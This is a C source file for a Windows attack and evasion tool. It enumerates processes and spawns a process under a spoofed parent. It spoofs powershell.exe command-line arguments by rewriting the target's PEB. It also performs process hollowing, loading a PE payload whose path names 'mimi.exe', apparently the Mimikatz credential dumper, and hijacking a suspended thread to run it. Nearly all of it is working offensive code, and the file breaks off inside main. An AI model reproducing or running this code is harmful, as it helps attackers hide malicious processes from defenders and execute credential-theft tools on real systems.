#include <Windows.h>
#include <winternl.h>
#include <stdio.h>

#include "Struct.h"

#pragma comment(lib, "WindowsApp.lib")
#pragma warning (disable:4996)
#pragma warning (disable:4047)
#pragma warning (disable:4477)

// ========================================================================================================================

#define PRINT_WINAPI_ERR(cApiName)	printf( "[!] %s Failed With Error: %d\n", cApiName, GetLastError())
#define GET_FILENAME(cPath)			(strrchr( cPath, '\\' ) ? strrchr( cPath, '\\' ) + 1 : cPath)

#define DELETE_HANDLE(H)						\
		if (H && H != INVALID_HANDLE_VALUE) {	\
			CloseHandle(H);						\
			H = NULL;							\
	}

// ========================================================================================================================


// ========================================================================================================================
typedef NTSTATUS(NTAPI* fnNtQuerySystemInformation)(
	SYSTEM_INFORMATION_CLASS SystemInformationClass,
	PVOID                    SystemInformation,
	ULONG                    SystemInformationLength,
	PULONG                   ReturnLength
	);

typedef NTSTATUS(NTAPI* fnNtQueryInformationProcess)(
	HANDLE ProcessHandle,
	PROCESSINFOCLASS ProcessInformationClass,
	PVOID ProcessInformation,
	ULONG ProcessInformationLength,
	PULONG ReturnLength
	);

BOOL GetRemoteProcessHandle(IN LPCWSTR szProcName, OUT DWORD * pdwPid, OUT HANDLE * phProcess) {

	fnNtQuerySystemInformation		pNtQuerySystemInformation = NULL;
	ULONG							uReturnLen1 = NULL,
		uReturnLen2 = NULL;
	PSYSTEM_PROCESS_INFORMATION		SystemProcInfo = NULL;
	PVOID							pValueToFree = NULL;
	NTSTATUS						STATUS = NULL;

	// getting NtQuerySystemInformation address
	pNtQuerySystemInformation = (fnNtQuerySystemInformation)GetProcAddress(GetModuleHandle(L"NTDLL.DLL"), "NtQuerySystemInformation");
	if (pNtQuerySystemInformation == NULL) {
		printf("[!] GetProcAddress Failed With Error : %d\n", GetLastError());
		return FALSE;
	}

	// First NtQuerySystemInformation call
	// This will fail with STATUS_INFO_LENGTH_MISMATCH
	// But it will provide information about how much memory to allocate (uReturnLen1)
	pNtQuerySystemInformation(SystemProcessInformation, NULL, NULL, &uReturnLen1);

	// allocating enough buffer for the returned array of `SYSTEM_PROCESS_INFORMATION` struct
	SystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (SIZE_T)uReturnLen1);
	if (SystemProcInfo == NULL) {
		printf("[!] HeapAlloc Failed With Error : %d\n", GetLastError());
		return FALSE;
	}

	// since we will modify 'SystemProcInfo', we will save its intial value before the while loop to free it later
	pValueToFree = SystemProcInfo;

	// Second NtQuerySystemInformation call
	// Calling NtQuerySystemInformation with the correct arguments, the output will be saved to 'SystemProcInfo'
	STATUS = pNtQuerySystemInformation(SystemProcessInformation, SystemProcInfo, uReturnLen1, &uReturnLen2);
	if (STATUS != 0x0) {
		printf("[!] NtQuerySystemInformation Failed With Error : 0x%0.8X \n", STATUS);
		return FALSE;
	}

	while (TRUE) {

		// wprintf(L"[i] Process \"%s\" - Of Pid : %d \n", SystemProcInfo->ImageName.Buffer, SystemProcInfo->UniqueProcessId);

		// Check the process's name size
		// Comparing the enumerated process name to the intended target process
		if (SystemProcInfo->ImageName.Length && wcscmp(SystemProcInfo->ImageName.Buffer, szProcName) == 0) {
			// openning a handle to the target process and saving it, then breaking 
			*pdwPid = (DWORD)SystemProcInfo->UniqueProcessId;
			*phProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)SystemProcInfo->UniqueProcessId);
			break;
		}

		// if NextEntryOffset is 0, we reached the end of the array
		if (!SystemProcInfo->NextEntryOffset)
			break;

		// moving to the next element in the array
		SystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)((ULONG_PTR)SystemProcInfo + SystemProcInfo->NextEntryOffset);
	}

	// Free the initial address
	HeapFree(GetProcessHeap(), 0, pValueToFree);

	// Check if we successfully got the target process handle
	if (*pdwPid == NULL || *phProcess == NULL)
		return FALSE;
	else
		return TRUE;
}
// ========================================================================================================================
BOOL ReadFileFromDisk(IN LPCSTR cFileName, OUT PBYTE* ppBuffer, OUT PDWORD pdwFileSize) {

	HANDLE	hFile				= INVALID_HANDLE_VALUE;
	PBYTE	pBufer				= NULL;
	DWORD	dwFileSize			= 0x00,
			dwNumberOfBytesRead = 0x00;

	if ((hFile = CreateFileA(cFileName, GENERIC_READ, 0x00, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE) {
		PRINT_WINAPI_ERR("CreateFileA");
		goto _FUNC_CLEANUP;
	}

	if ((dwFileSize = GetFileSize(hFile, NULL)) == INVALID_FILE_SIZE) {
		PRINT_WINAPI_ERR("GetFileSize");
		goto _FUNC_CLEANUP;
	}

	if ((pBufer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwFileSize)) == NULL) {
		PRINT_WINAPI_ERR("HeapAlloc");
		goto _FUNC_CLEANUP;
	}

	if (!ReadFile(hFile, pBufer, dwFileSize, &dwNumberOfBytesRead, NULL) || dwFileSize != dwNumberOfBytesRead) {
		PRINT_WINAPI_ERR("ReadFile");
		goto _FUNC_CLEANUP;
	}

	*ppBuffer = pBufer;
	*pdwFileSize = dwFileSize;

_FUNC_CLEANUP:
	if (hFile != INVALID_HANDLE_VALUE)
		CloseHandle(hFile);
	if (!*ppBuffer && pBufer)
		HeapFree(GetProcessHeap(), 0x00, pBufer);
	return ((*ppBuffer != NULL) && (*pdwFileSize != 0x00)) ? TRUE : FALSE;
}

// ========================================================================================================================

BOOL FixMemPermissionsEx(IN HANDLE hProcess, IN ULONG_PTR pPeBaseAddress, IN PIMAGE_NT_HEADERS pImgNtHdrs, IN PIMAGE_SECTION_HEADER pImgSecHdr) {

	// Loop through each section of the PE image.
	for (DWORD i = 0; i < pImgNtHdrs->FileHeader.NumberOfSections; i++) {

		// Variables to store the new and old memory protections.
		DWORD	dwProtection		= 0x00,
				dwOldProtection		= 0x00;

		// Skip the section if it has no data or no associated virtual address.
		if (!pImgSecHdr[i].SizeOfRawData || !pImgSecHdr[i].VirtualAddress)
			continue;

		// Determine memory protection based on section characteristics.
		// These characteristics dictate whether the section is readable, writable, executable, etc.
		if (pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_WRITE)
			dwProtection = PAGE_WRITECOPY;

		if (pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_READ)
			dwProtection = PAGE_READONLY;

		if ((pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_WRITE) && (pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_READ))
			dwProtection = PAGE_READWRITE;

		if (pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_EXECUTE)
			dwProtection = PAGE_EXECUTE;

		if ((pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) && (pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_WRITE))
			dwProtection = PAGE_EXECUTE_WRITECOPY;

		if ((pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) && (pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_READ))
			dwProtection = PAGE_EXECUTE_READ;

		if ((pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) && (pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_WRITE) && (pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_READ))
			dwProtection = PAGE_EXECUTE_READWRITE;

		// Apply the determined memory protection to the section.
		if (!VirtualProtectEx(hProcess, (PVOID)(pPeBaseAddress + pImgSecHdr[i].VirtualAddress), pImgSecHdr[i].SizeOfRawData, dwProtection, &dwOldProtection)) {
			PRINT_WINAPI_ERR("VirtualProtectEx");
			return FALSE;
		}
	}

	return TRUE;
}

// ========================================================================================================================

VOID PrintOutput(IN HANDLE StdOutRead) {

	BOOL		bSTATE	= TRUE;

	do {

		DWORD	dwAvailableBytes	= 0x00;
		PBYTE	pBuffer				= 0x00;

		PeekNamedPipe(StdOutRead, NULL, NULL, NULL, &dwAvailableBytes, NULL);

		pBuffer = (PBYTE)LocalAlloc(LPTR, (SIZE_T)dwAvailableBytes);
		if (!pBuffer)
			break;

		if (!(bSTATE = ReadFile(StdOutRead, pBuffer, dwAvailableBytes, NULL, NULL))) {
			LocalFree(pBuffer);
			break;
		}

		printf(pBuffer);

		LocalFree(pBuffer);

	} while (bSTATE);
}

// ========================================================================================================================

BOOL CreateTheHollowedProcess(IN LPCSTR cRemoteProcessImage, IN OPTIONAL LPCSTR cProcessParms, OUT PPROCESS_INFORMATION pProcessInfo, OUT HANDLE* pStdInWrite, OUT HANDLE* pStdOutRead) {

	STARTUPINFO					StartupInfo			= { 0x00 };
	SECURITY_ATTRIBUTES			SecAttr				= { 0x00 };
	HANDLE						StdInRead			= NULL,		// Handle for reading from the input pipe. This will be closed.
								StdInWrite			= NULL,		// Handle for writing to the input pipe.
								StdOutRead			= NULL,		// Handle for reading from the output pipe.
								StdOutWrite			= NULL;		// Handle for writing to the output pipe. This will be closed.
	LPCSTR						cRemoteProcessCmnd	= NULL;
	BOOL						bSTATE				= FALSE;

	RtlSecureZeroMemory(pProcessInfo, sizeof(PROCESS_INFORMATION));
	RtlSecureZeroMemory(&StartupInfo, sizeof(STARTUPINFO));
	RtlSecureZeroMemory(&SecAttr, sizeof(SECURITY_ATTRIBUTES));

	SecAttr.nLength					= sizeof(SECURITY_ATTRIBUTES);
	SecAttr.bInheritHandle			= TRUE;
	SecAttr.lpSecurityDescriptor	= NULL;

	// Initialize Anonymous Input Pipe
	if (!CreatePipe(&StdInRead, &StdInWrite, &SecAttr, 0x00)) {
		PRINT_WINAPI_ERR("CreatePipe[1]");
		goto _FUNC_CLEANUP;
	}

	// Initialize Anonymous Output Pipe
	if (!CreatePipe(&StdOutRead, &StdOutWrite, &SecAttr, 0x00)) {
		PRINT_WINAPI_ERR("CreatePipe[2]");
		goto _FUNC_CLEANUP;
	}

	// Initialize I/O Pipes
	StartupInfo.cb				= sizeof(STARTUPINFO);
	StartupInfo.dwFlags			|= (STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES);
	StartupInfo.wShowWindow		= SW_HIDE;
	StartupInfo.hStdInput		= StdInRead;
	StartupInfo.hStdOutput		= StartupInfo.hStdError = StdOutWrite;

	cRemoteProcessCmnd = LocalAlloc(LPTR, (strlen(cRemoteProcessImage) + (cProcessParms ? strlen(cProcessParms) : 0x00) + (sizeof(CHAR) * 2)));
	if (!cRemoteProcessCmnd) {
		PRINT_WINAPI_ERR("LocalAlloc");
		goto _FUNC_CLEANUP;
	}

	// Create the process
	sprintf(cRemoteProcessCmnd, cProcessParms == NULL ? "%s" : "%s %s", cRemoteProcessImage, cProcessParms == NULL ? "" : cProcessParms);
	if (!CreateProcessA(NULL, cRemoteProcessCmnd, &SecAttr, NULL, TRUE, (CREATE_SUSPENDED | CREATE_NEW_CONSOLE), NULL, NULL, &StartupInfo, pProcessInfo)) {
		PRINT_WINAPI_ERR("CreateProcessA");
		goto _FUNC_CLEANUP;
	}

	printf("[*] Target Process Created With PID: %d \n", pProcessInfo->dwProcessId);

	*pStdInWrite = StdInWrite;
	*pStdOutRead = StdOutRead;

	bSTATE = TRUE;

_FUNC_CLEANUP:
	if (cRemoteProcessCmnd)
		LocalFree(cRemoteProcessCmnd);
	// Close handles to make it non-blocking (without getting blocked waiting for the child process to read or write data)
	// This leaves StdInWrite && StdOutRead handles open
	DELETE_HANDLE(StdInRead);
	DELETE_HANDLE(StdOutWrite);
	return TRUE;
}

// ========================================================================================================================


BOOL ReplaceBaseAddressImage(IN HANDLE hProcess, IN ULONG_PTR uPeBaseAddress, IN ULONG_PTR Rdx) {

	ULONG_PTR	uRemoteImageBaseOffset	= 0x00,
				uRemoteImageBase		= 0x00;

	SIZE_T		NumberOfBytesRead		= 0x00,
				NumberOfBytesWritten	= 0x00;


	// Get the offset of the ImageBaseAddress in the PEB structure
	// Context.Rdx is PPEB
	// Context.Rdx + offsetof(PEB, Reserved3[1])) is PPEB->Reserved3[1], which is ImageBaseAddress
	uRemoteImageBaseOffset = (PVOID)(Rdx + offsetof(PEB, Reserved3[1]));

	// FOR DEBUGGING
	/*
	// Reading the original image base address
	if (!ReadProcessMemory(hProcess, uRemoteImageBaseOffset, &uRemoteImageBase, sizeof(PVOID), &NumberOfBytesRead) || sizeof(PVOID) != NumberOfBytesRead){
		PRINT_WINAPI_ERR("ReadProcessMemory");
		return FALSE;
	}
	
	printf("[i] Replacing Original Image Address From %p To %p ... \n", (void*)uRemoteImageBase, (void*)uPeBaseAddress);
	*/

	printf("[i] Overwriting Image Base Address ... ");

	// Write remote image base:
	if (!WriteProcessMemory(hProcess, (PVOID)uRemoteImageBaseOffset, &uPeBaseAddress, sizeof(PVOID), &NumberOfBytesWritten) || sizeof(PVOID) != NumberOfBytesWritten) {
		PRINT_WINAPI_ERR("WriteProcessMemory");
		return FALSE;
	}

	printf("[+] DONE \n");

	return TRUE;
}


// ========================================================================================================================



BOOL RemotePeExec(IN PBYTE pPeBuffer, IN LPCSTR cRemoteProcessImage, IN OPTIONAL LPCSTR cProcessParms) {

	if (!pPeBuffer || !cRemoteProcessImage)
		return FALSE;

	PROCESS_INFORMATION		ProcessInfo				= { 0x00 };
	CONTEXT					Context					= { .ContextFlags = CONTEXT_ALL };
	HANDLE					StdInWrite				= NULL,		// Handle for writing to the input pipe.
							StdOutRead				= NULL;		// Handle for reading from the output pipe.
	PBYTE					pRemoteAddress			= NULL;
	PIMAGE_NT_HEADERS		pImgNtHdrs				= NULL;
	PIMAGE_SECTION_HEADER	pImgSecHdr				= NULL;
	SIZE_T					NumberOfBytesWritten	= NULL;
	BOOL					bSTATE					= FALSE;


	// Create the hollowed process
	if (!CreateTheHollowedProcess(cRemoteProcessImage, cProcessParms, &ProcessInfo, &StdInWrite, &StdOutRead))
		goto _FUNC_CLEANUP;

	if (!ProcessInfo.hProcess || !ProcessInfo.hThread)
		goto _FUNC_CLEANUP;

	printf("[i] Press <Enter> To Continue...");
	getchar();


	// Retrieve NT image headers 
	pImgNtHdrs = (PIMAGE_NT_HEADERS)((ULONG_PTR)pPeBuffer + ((PIMAGE_DOS_HEADER)pPeBuffer)->e_lfanew);
	if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE) {
		printf("[!] Invalid NT Image Headers\n");
		goto _FUNC_CLEANUP;
	}

	// Allocate remote virtual memory
	if (!(pRemoteAddress = VirtualAllocEx(ProcessInfo.hProcess, (LPVOID)pImgNtHdrs->OptionalHeader.ImageBase, (SIZE_T)pImgNtHdrs->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) {
		PRINT_WINAPI_ERR("VirtualAllocEx");
		goto _FUNC_CLEANUP;
	}

	printf("[*] Remote Image Base Address: 0x%p\n", pRemoteAddress);
	printf("[i] Preferable Base Address: 0x%p\n", (LPVOID)pImgNtHdrs->OptionalHeader.ImageBase);

	// Check if the image base is the same as the one in the headers
	if (pRemoteAddress != (LPVOID)pImgNtHdrs->OptionalHeader.ImageBase) {
		printf("[!] PE Payload Will Require Relocation - [NOT SUPPORTED]\n");
		goto _FUNC_CLEANUP;
	}

	printf("[i] Press <Enter> To Write The PE Payload ...");
	getchar();

	// Copy over image header
	if (!WriteProcessMemory(ProcessInfo.hProcess, pRemoteAddress, pPeBuffer, pImgNtHdrs->OptionalHeader.SizeOfHeaders, &NumberOfBytesWritten) || pImgNtHdrs->OptionalHeader.SizeOfHeaders != NumberOfBytesWritten) {
		PRINT_WINAPI_ERR("WriteProcessMemory");
		goto _FUNC_CLEANUP;
	}

	printf("[*] Wrote Headers At %p Of Size %d \n", (void*)pRemoteAddress, (int)pImgNtHdrs->OptionalHeader.SizeOfHeaders);
	printf("[i] Writing Sections ... \n");

	// Copy over sections 
	pImgSecHdr = IMAGE_FIRST_SECTION(pImgNtHdrs);
	for (int i = 0; i < pImgNtHdrs->FileHeader.NumberOfSections; i++) {

		printf("\t<i> Writing Section %s At %p Of Size %d \n", pImgSecHdr[i].Name, (void*)(pRemoteAddress + pImgSecHdr[i].VirtualAddress), (int)pImgSecHdr[i].SizeOfRawData);

		if (!WriteProcessMemory(ProcessInfo.hProcess, (PVOID)(pRemoteAddress + pImgSecHdr[i].VirtualAddress), (PVOID)(pPeBuffer + pImgSecHdr[i].PointerToRawData), pImgSecHdr[i].SizeOfRawData, &NumberOfBytesWritten) || pImgSecHdr[i].SizeOfRawData != NumberOfBytesWritten) {
			PRINT_WINAPI_ERR("WriteProcessMemory");
			goto _FUNC_CLEANUP;
		}
	}


	// Get thread context of the main thread
	if (!GetThreadContext(ProcessInfo.hThread, &Context)) {
		PRINT_WINAPI_ERR("GetThreadContext");
		goto _FUNC_CLEANUP;
	}

	// Patch the 'ImageBaseAddress' element in the 'PEB' structure of the remote process to point to our PE instead
	if (!ReplaceBaseAddressImage(ProcessInfo.hProcess, pRemoteAddress, Context.Rdx)) {
		goto _FUNC_CLEANUP;
	}

	// Set suitable memory permissions
	if (!FixMemPermissionsEx(ProcessInfo.hProcess, pRemoteAddress, pImgNtHdrs, pImgSecHdr))
		goto _FUNC_CLEANUP;

	printf("[i] Press <Enter> To Execute The Entry Payload ...");
	getchar();
	printf("[i] Hijacking Thread To Run EntryPoint: %p ... ", (LPVOID)(pRemoteAddress + pImgNtHdrs->OptionalHeader.AddressOfEntryPoint));

	// Thread Hijacking:
	Context.Rcx = (LPVOID)(pRemoteAddress + pImgNtHdrs->OptionalHeader.AddressOfEntryPoint);
	if (!SetThreadContext(ProcessInfo.hThread, &Context)) {
		PRINT_WINAPI_ERR("SetThreadContext");
		goto _FUNC_CLEANUP;
	}
	printf("[+] DONE\n");

	
	printf("[i] Press <Enter> To Resume The Process ... ");
	getchar();

	// Resume thread
	if (ResumeThread(ProcessInfo.hThread) == ((DWORD)-1)) {
		PRINT_WINAPI_ERR("ResumeThread");
		goto _FUNC_CLEANUP;
	}

	// Wait till the process runs the code
	WaitForSingleObject(ProcessInfo.hProcess, INFINITE);	

	// Read output
	printf("[*] Reading output: \n\n");
	PrintOutput(StdOutRead);

	bSTATE = TRUE;

_FUNC_CLEANUP:
	DELETE_HANDLE(StdInWrite);
	DELETE_HANDLE(StdOutRead);
	DELETE_HANDLE(ProcessInfo.hProcess);
	DELETE_HANDLE(ProcessInfo.hThread);
	return bSTATE;
}


// ========================================================================================================================


#define PE_PAYLOAD							"C:\\Users\\dawid\\Downloads\\ProcessHollowing\\ProcessHollowing\\mimi.exe"
#define TARGET_PROCESS						"RuntimeBroker.exe" //"C:\\Windows\\System32\\RuntimeBroker.exe"
#define SIZE_EXPOSED_FROMPAYLOAD			sizeof(L"powershell.exe")
#define STARTUP_ARGUMENTS					L"powershell.exe legit arg"
#define REAL_EXECUTED_ARGUMENTS				"coffee exit"

/*
Parameters:

	- hParentProcess; handle to the process you want to be the parent of the created process
	- lpProcessName; a process name under '\System32\' to create
	- dwProcessId; outputted process id (of the newly created process)
	- hProcess; outputted process handle (of the newly created process)
	- hThread; outputted main thread handle (of the newly created process)

Creates a new process `lpProcessName`, forcing `hParentProcess` to look like its parent

*/

BOOL CreatePPidSpoofedProcess(IN HANDLE hParentProcess, IN LPCSTR lpProcessName, OUT DWORD* dwProcessId, OUT HANDLE* hProcess, OUT HANDLE* hThread) {

	CHAR					lpPath[MAX_PATH * 2];
	CHAR					CurrentDir[MAX_PATH];
	CHAR					WnDr[MAX_PATH];

	SIZE_T							sThreadAttList = NULL;
	PPROC_THREAD_ATTRIBUTE_LIST		pThreadAttList = NULL;

	STARTUPINFOEXA			SiEx = { 0 };
	PROCESS_INFORMATION		Pi = { 0 };

	// cleaning the structs (setting elements values to 0)
	RtlSecureZeroMemory(&SiEx, sizeof(STARTUPINFOEXA));
	RtlSecureZeroMemory(&Pi, sizeof(PROCESS_INFORMATION));

	// setting the size of the structure
	SiEx.StartupInfo.cb = sizeof(STARTUPINFOEXA);

	// getting the %windir% system variable path (this is 'C:\Windows')
	if (!GetEnvironmentVariableA("WINDIR", WnDr, MAX_PATH)) {
		printf("[!] GetEnvironmentVariableA Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// making the target process path
	sprintf(lpPath, "%s\\System32\\%s", WnDr, lpProcessName);

	// making the `lpCurrentDirectory` parameter in CreateProcessA
	sprintf(CurrentDir, "%s\\System32\\", WnDr);


	//-------------------------------------------------------------------------------

		// this will fail with ERROR_INSUFFICIENT_BUFFER / 122
	InitializeProcThreadAttributeList(NULL, 1, NULL, &sThreadAttList);

	// allocating enough memory
	pThreadAttList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sThreadAttList);
	if (pThreadAttList == NULL) {
		printf("[!] HeapAlloc Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// calling InitializeProcThreadAttributeList again passing the right parameters
	if (!InitializeProcThreadAttributeList(pThreadAttList, 1, NULL, &sThreadAttList)) {
		printf("[!] InitializeProcThreadAttributeList Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	if (!UpdateProcThreadAttribute(pThreadAttList, NULL, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParentProcess, sizeof(HANDLE), NULL, NULL)) {
		printf("[!] UpdateProcThreadAttribute Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// setting the `LPPROC_THREAD_ATTRIBUTE_LIST` element in `SiEx` to be equal to what was
	// created using `UpdateProcThreadAttribute` - that is the parent process
	SiEx.lpAttributeList = pThreadAttList;

	//-------------------------------------------------------------------------------

	printf("[i] Running : \"%s\" ... ", lpPath);

	if (!CreateProcessA(
		NULL,
		lpPath,
		NULL,
		NULL,
		FALSE,
		EXTENDED_STARTUPINFO_PRESENT,
		NULL,
		CurrentDir,
		&SiEx.StartupInfo,
		&Pi)) {
		printf("[!] CreateProcessA Failed with Error : %d \n", GetLastError());
		return FALSE;
	}

	printf("[+] DONE \n");


	// filling up the OUTPUT parameter with 'CreateProcessA's output'
	*dwProcessId = Pi.dwProcessId;
	*hProcess = Pi.hProcess;
	*hThread = Pi.hThread;


	// cleaning up
	DeleteProcThreadAttributeList(pThreadAttList);
	CloseHandle(hParentProcess);

	// doing a small check to verify we got everything we need
	if (*dwProcessId != NULL && *hProcess != NULL && *hThread != NULL)
		return TRUE;

	return FALSE;
}

// Helper Function
// Read Data from remote process of handle `hProcess` from the address `pAddress` of size `dwBufferSize`
// output base address is saved in `ppReadBuffer` parameter 
BOOL ReadFromTargetProcess(IN HANDLE hProcess, IN PVOID pAddress, OUT PVOID* ppReadBuffer, IN DWORD dwBufferSize) {

	SIZE_T	sNmbrOfBytesRead = NULL;

	*ppReadBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwBufferSize);

	if (!ReadProcessMemory(hProcess, pAddress, *ppReadBuffer, dwBufferSize, &sNmbrOfBytesRead) || sNmbrOfBytesRead != dwBufferSize) {
		printf("[!] ReadProcessMemory Failed With Error : %d \n", GetLastError());
		printf("[i] Bytes Read : %d Of %d \n", sNmbrOfBytesRead, dwBufferSize);
		return FALSE;
	}

	return TRUE;
}

// Helper Function
// Write Data to remote process of handle `hProcess` at the address `pAddressToWriteTo`
// `pBuffer` is the data to be written of size `dwBufferSize`
BOOL WriteToTargetProcess(IN HANDLE hProcess, IN PVOID pAddressToWriteTo, IN PVOID pBuffer, IN DWORD dwBufferSize) {

	SIZE_T sNmbrOfBytesWritten = NULL;

	if (!WriteProcessMemory(hProcess, pAddressToWriteTo, pBuffer, dwBufferSize, &sNmbrOfBytesWritten) || sNmbrOfBytesWritten != dwBufferSize) {
		printf("[!] WriteProcessMemory Failed With Error : %d \n", GetLastError());
		printf("[i] Bytes Written : %d Of %d \n", sNmbrOfBytesWritten, dwBufferSize);
		return FALSE;
	}

	return TRUE;
}

BOOL CreateArgSpoofedProcess2(IN LPWSTR szStartupArgs, IN LPWSTR szRealArgs, OUT DWORD* dwProcessId, OUT HANDLE* hProcess, OUT HANDLE* hThread) {


	NTSTATUS						STATUS = NULL;

	WCHAR							szProcess[MAX_PATH];

	STARTUPINFOW					Si = { 0 };
	PROCESS_INFORMATION				Pi = { 0 };

	PROCESS_BASIC_INFORMATION		PBI = { 0 };
	ULONG							uRetern = NULL;

	PPEB							pPeb = NULL;
	PRTL_USER_PROCESS_PARAMETERS	pParms = NULL;

	RtlSecureZeroMemory(&Si, sizeof(STARTUPINFOW));
	RtlSecureZeroMemory(&Pi, sizeof(PROCESS_INFORMATION));

	Si.cb = sizeof(STARTUPINFOW);

	// getting the address of the `NtQueryInformationProcess` function
	fnNtQueryInformationProcess pNtQueryInformationProcess = (fnNtQueryInformationProcess)GetProcAddress(GetModuleHandleW(L"NTDLL"), "NtQueryInformationProcess");
	if (pNtQueryInformationProcess == NULL)
		return FALSE;


	lstrcpyW(szProcess, STARTUP_ARGUMENTS);

	wprintf(L"\t[i] Running : \"%s\" ... ", szProcess);

	if (!CreateProcessW(
		NULL,
		szProcess,
		NULL,
		NULL,
		FALSE,
		CREATE_SUSPENDED | CREATE_NO_WINDOW,			// creating the process suspended & with no window
		NULL,
		L"C:\\Windows\\System32\\",						// we can use GetEnvironmentVariableW to get this Programmatically
		&Si,
		&Pi)) {
		printf("\t[!] CreateProcessA Failed with Error : %d \n", GetLastError());
		return FALSE;
	}

	printf("[+] DONE \n");

	printf("\t[i] Target Process Created With Pid : %d \n", Pi.dwProcessId);


	// gettint the `PROCESS_BASIC_INFORMATION` structure of the remote process (that contains the peb address)
	if ((STATUS = pNtQueryInformationProcess(Pi.hProcess, ProcessBasicInformation, &PBI, sizeof(PROCESS_BASIC_INFORMATION), &uRetern)) != 0) {
		printf("\t[!] NtQueryInformationProcess Failed With Error : 0x%0.8X \n", STATUS);
		return FALSE;
	}

	// reading the `peb` structure from its base address in the remote process
	if (!ReadFromTargetProcess(Pi.hProcess, PBI.PebBaseAddress, &pPeb, sizeof(PEB))) {
		printf("\t[!] Failed To Read Target's Process Peb \n");
		return FALSE;
	}

	// reading the `ProcessParameters` structure from the peb of the remote process
	// we read extra `0xFF` bytes to insure we have reached the CommandLine.Buffer pointer
	// `0xFF` is 255, this can be whatever you like
	if (!ReadFromTargetProcess(Pi.hProcess, pPeb->ProcessParameters, &pParms, sizeof(RTL_USER_PROCESS_PARAMETERS) + 0xFF)) {
		printf("\t[!] Failed To Read Target's Process ProcessParameters \n");
		return FALSE;
	}

	// writing the parameter we want to run
	wprintf(L"\t[i] Writing \"%s\" As The Process Argument At : 0x%p ... ", szRealArgs, (PVOID)pParms->CommandLine.Buffer);
	if (!WriteToTargetProcess(Pi.hProcess, (PVOID)pParms->CommandLine.Buffer, (PVOID)szRealArgs, (DWORD)(lstrlenW(szRealArgs) * sizeof(WCHAR) + 1))) {
		printf("\t[!] Failed To Write The Real Parameters\n");
		return FALSE;
	}
	printf("[+] DONE \n");



	// runtime spoofing - to change from "powershell.exe -NoExit calc.exe ument" to "powershell.exe"

	DWORD dwNewLen = SIZE_EXPOSED_FROMPAYLOAD;

	wprintf(L"\n\t[i] Updating The Length Of The Process Argument From %d To %d ...", pParms->CommandLine.Length, dwNewLen);
	if (!WriteToTargetProcess(Pi.hProcess, ((PBYTE)pPeb->ProcessParameters + offsetof(RTL_USER_PROCESS_PARAMETERS, CommandLine.Length)), (PVOID)&dwNewLen, sizeof(DWORD))) {
		printf("\t[!] Failed To Write The Real Parameters\n");
		return FALSE;
	}
	printf("[+] DONE \n");

	// cleaning up
	HeapFree(GetProcessHeap(), NULL, pPeb);
	HeapFree(GetProcessHeap(), NULL, pParms);

	// resuming the process with new paramters
	ResumeThread(Pi.hThread);

	// saving output parameters
	*dwProcessId = Pi.dwProcessId;
	*hProcess = Pi.hProcess;
	*hThread = Pi.hThread;

	// checking if everything is valid
	if (*dwProcessId != NULL, *hProcess != NULL && *hThread != NULL)
		return TRUE;

	return FALSE;
}

#define TARGET_PROCESS2 L"Notepad.exe"

int main() {

	PBYTE	pBuffer = NULL;
	DWORD	dwBuffer = 0x00;
	DWORD processid = NULL;
	HANDLE hThread = NULL;

	if (!GetRemoteProcessHandle(TARGET_PROCESS2, &processid, &hThread)) {
		wprintf(L"[!] Could Not Get %s Process ID \n", TARGET_PROCESS2);
		return -1;
	}

	wprintf(L"[+] FOUND \"%s\" - Of Pid : %d \n", TARGET_PROCESS2);
	
	DWORD dwPPid = processid,
		dwProcessId = NULL;

	HANDLE hPProcess = NULL,
		hProcess = NULL;

	//opening a handle to the parent process
	if ((hPProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPPid)) == NULL) {
		printf("[!] OpenProcess Failed with Error : %d \n", GetLastError());
		return -1;
	}

	printf("[i] Spawning Target Process \"%s\" With Parent : %d \n", TARGET_PROCESS, dwPPid);
	if (!CreatePPidSpoofedProcess(hPProcess, TARGET_PROCESS, &dwProcessId, &hProcess, &hThread)) {
		return -1;
	}

	printf("[i] Target Process Created With Pid : %d\n", dwProcessId);
	printf("[!] Click ENTER!!!\n");
	getchar();

	wprintf(L"[i] Target PRocess will be created with [Startup Arguments] : \"%s\" \n", STARTUP_ARGUMENTS);
	wprintf(L"[i] The Actual Arguments [Payload Argument] : \"%s\" \n", REAL_EXECUTED_ARGUMENTS);

	if (!CreateArgSpoofedProcess2(STARTUP_ARGUMENTS, REAL_EXECUTED_ARGUMENTS, &dwProcessId, &hProcess, &hThread)) {
		return -1;
	}

	printf("[!] Click ENTER!!!");
	wprintf(L"[i] Running Process Hollowing ... \n");

	if (!ReadFileFromDisk(PE_PAYLOAD, &pBuffer, &dwBuffer)) {
		return -1;
	}

	CloseHandle(hProcess);
	CloseHandle(hThread);

